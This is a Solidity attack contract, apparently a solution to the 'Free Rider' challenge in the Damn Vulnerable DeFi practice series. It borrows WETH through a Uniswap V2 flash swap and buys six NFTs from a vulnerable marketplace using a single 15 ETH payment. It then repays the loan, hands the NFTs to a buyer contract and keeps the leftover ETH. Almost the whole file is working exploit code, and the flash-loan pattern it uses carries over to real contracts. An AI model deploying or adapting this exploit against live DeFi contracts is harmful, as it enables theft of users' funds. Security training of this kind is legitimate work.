// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./Uniswap.sol";
import "./FreeRiderNFTMarketplace.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH {
    function withdraw(uint256) external;

    function deposit() external payable;
}

contract AttackerContract is IUniswapV2Callee, IERC721Receiver {
    address private weth;
    address private uniswapFactory;
    IMarketplace marketplace;
    address private token0;
    address private token1;
    DamnValuableNFT nft;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
    address private freeRider;
    address private from;

    constructor(
        address _wethAddress,
        address _uniswapFactoryAddress,
        address _marketplaceAddress,
        address _token0Address,
        address _token1Address,
        address _dvnftAddress,
        address _freeRiderBuyerAddress
    ) {
        weth = _wethAddress;
        uniswapFactory = _uniswapFactoryAddress;
        marketplace = IMarketplace(_marketplaceAddress);
        token0 = _token0Address;
        token1 = _token1Address;
        nft = DamnValuableNFT(_dvnftAddress);
        freeRider = _freeRiderBuyerAddress;
    }

    function flashSwapAndExploit(uint256 _amount) external {
        address pair = IUniswapV2Factory(uniswapFactory).getPair(
            token0,
            token1
        );
        require(pair != address(0), "!pair");

        uint256 amount0Out = _amount;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(token0, _amount);

        IUniswapV2Pair(pair).swap(amount0Out, 0, address(this), data);

        bool success = payable(msg.sender).send(address(this).balance);
        require(success, "Couldn't send ETH.");
    }

    // called by pair contract
    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external override {
        address pair = IUniswapV2Factory(uniswapFactory).getPair(
            token0,
            token1
        );
        require(msg.sender == pair, "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(
            _data,
            (address, uint256)
        );

        // Get ETH from WETH
        IWETH(weth).withdraw(15 ether);

        // Buy NFTs with ETH
        marketplace.buyMany{value: 15 ether}(tokenIds);

        // Fee = 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = (amount + fee);

        // Deposit WETH from ETH
        IWETH(weth).deposit{value: amountToRepay}();

        // Pay back
        IERC20(tokenBorrow).transfer(pair, amountToRepay);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), freeRider, i);
        }
    }

    receive() external payable {}

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
